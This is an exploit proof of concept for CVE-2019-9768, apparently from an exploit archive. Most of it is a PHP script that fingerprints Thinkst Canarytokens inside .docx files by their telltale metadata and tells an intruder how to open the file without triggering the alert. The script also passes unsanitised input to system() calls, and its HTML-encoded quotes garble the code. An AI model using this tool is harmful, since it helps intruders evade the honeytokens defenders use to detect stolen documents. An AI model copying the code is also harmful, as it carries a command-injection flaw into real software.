# Exploit Author: Benjamin Zink Loft, Gionathan "John" Reale 
# Vendor Homepage: https://thinkst.com/
# Version: up to 2019-03-01
# Software Link: https://github.com/thinkst/canarytokens
# Google Dork: N/A 
# CVE: 2019-9768 
#==================================================================================================================================================================================
# PoC:
#
#
#
# Requires unzip:
#
# sudo apt-get install unzip
#
#


<?php
 
system(&#039;unzip &#039; . $argv[1] . &#039;.docx&#039;);
 
system(&#039;cp &#039; . $argv[1] . &#039;.docx ./docProps/&#039; . $argv[1] . &#039;.docx && cd docProps&#039;);
 
$strFile = file_get_contents("docProps/core.xml");
 
if(strpos($strFile, &#039;AAAAAAAAAAAAAAAA&#039;)!=false && strpos($strFile, &#039;2015-07-21&#039;)!=false && filesize( $argv[1] .".docx") < 170000 )
{
     echo "This file probably contains a CanaryToken! Open it with Libreoffice/Microsoft Word Protected View to bypass detection";
}
else
{
     echo "Should be safe to open normally";
}
?>

